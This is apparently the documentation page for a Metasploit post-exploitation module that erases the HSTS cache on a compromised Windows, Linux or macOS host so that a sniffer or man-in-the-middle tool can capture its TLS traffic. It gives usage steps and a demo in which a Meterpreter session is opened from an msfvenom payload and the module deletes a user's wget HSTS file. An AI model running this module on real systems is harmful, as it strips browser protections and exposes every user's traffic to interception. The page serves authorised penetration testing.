This module allows you to erase the [HTTP Strict-Transport-Security](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security) cache of a target machine.  When combined with a sniffer or a man-in-the-middle tool, this module will assist with the capture/modification of TLS-encrypted traffic.

**WARNING:** This module _erases_ the HSTS cache, leaving the target in a vulnerable state.  All browser traffic from all users on the target will be subject to man-in-the-middle attacks.  There is no undo built-into this module.  If you intend to revert, you must first backup the HSTS file before running the module.

Note: This module searches for all non-root users on the system.  It will not erase HSTS data for the root user.

## Vulnerable Application

The following platforms are supported:
* Windows
* Linux
* OS X

## Verification Steps

1. Obtain and background a session from the target machine.
2. From the `msf>` prompt, do ```use post/multi/manage/hsts_eraser```
3. Set the ```DISCLAIMER``` option to ```True``` (after reading the above **WARNING**)
4. Set the ```SESSION``` option
5. ```run```

Alternatively:

1. Obtain a session from the target machine.
2. From the `meterpreter>` prompt, do ```run post/multi/manage/hsts_eraser DISCLAIMER=True```

## Demo

Set up a Kali VM with some HSTS data:

```bash
root@kali-2017:~# adduser bob
root@kali-2017:~# su bob
bob@kali-2017:/root$ cd

bob@kali-2017:~$ wget -S https://outlook.live.com/owa/ 2>&1 | grep -i strict
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  Strict-Transport-Security: max-age=31536000; includeSubDomains
bob@kali-2017:~$ cat .wget-hsts 
# HSTS 1.0 Known Hosts database for GNU Wget.
# Edit at your own risk.
# <hostname>	<port>	<incl. subdomains>	<created>	<max-age>
outlook.live.com	0	1	1519176414	31536000
```

Create an `msfvenom` payload, execute it, and then connect to it with `multi/exploit/handler`.  From the Meterpreter session on the victim:

```
[*] Meterpreter session 1 opened (127.0.0.1:38089 -> 127.0.0.1:44444) at 2018-02-20 19:19:02 -0600

meterpreter > run post/multi/manage/hsts_eraser DISCLAIMER=True

[*] Removing wget HSTS database for bob... 
[*] HSTS databases removed! Now enjoy your favorite sniffer! ;-)
```

Confirm that the file was deleted:

```bash
bob@kali-2017:~$ cat .wget-hsts 
cat: .wget-hsts: No such file or directory
```
